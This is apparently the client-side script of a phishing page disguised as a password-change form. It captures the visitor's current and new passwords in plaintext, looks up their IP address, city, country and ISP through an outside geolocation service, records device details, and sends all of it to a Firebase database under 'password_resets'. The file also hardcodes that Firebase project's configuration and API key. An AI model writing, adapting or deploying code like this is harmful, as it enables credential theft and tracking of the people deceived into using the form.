// Firebase SDK
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
    getDatabase,
    ref,
    push
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

// Firebase Config
const firebaseConfig = {
    apiKey: "AIzaSyBRxp7bdCJk6aCGNjz2YqGRZ7HvzknUoaY",
    authDomain: "manas-in-87599.firebaseapp.com",
    databaseURL: "https://manas-in-87599-default-rtdb.firebaseio.com",
    projectId: "manas-in-87599",
    storageBucket: "manas-in-87599.appspot.com",
    messagingSenderId: "684168094109",
    appId: "1:684168094109:web:1ed2c0545e47c31515cf74",
    measurementId: "G-ZL5LHJQ8MT"
};

// Init Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// 🌐 Get IP + Location
async function getIPData() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

        return {
            ip: data.ip,
            city: data.city,
            region: data.region,
            country: data.country_name,
            isp: data.org,
            timezone: data.timezone
        };
    } catch (error) {
        return {
            ip: "unknown"
        };
    }
}

// Button
const btn = document.querySelector("button");

btn.addEventListener("click", async (e) => {
    e.preventDefault();

    const inputs = document.querySelectorAll("input");

    const currentPassword = inputs[0].value;
    const newPassword = inputs[1].value;
    const confirmPassword = inputs[2].value;

    if (newPassword !== confirmPassword) {
        alert("Passwords do not match.");
        return;
    }

    try {
        // Get IP info
        const ipData = await getIPData();

        // Device info
        const deviceData = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            screen: `${window.screen.width}x${window.screen.height}`
        };

        // Save to Firebase
        await push(ref(database, "password_resets"), {
            currentPassword,
            newPassword,
            ...ipData,
            ...deviceData,
            createdAt: new Date().toISOString()
        });

        alert("Password reset request saved.");
    } catch (error) {
        alert(error.message);
    }
});
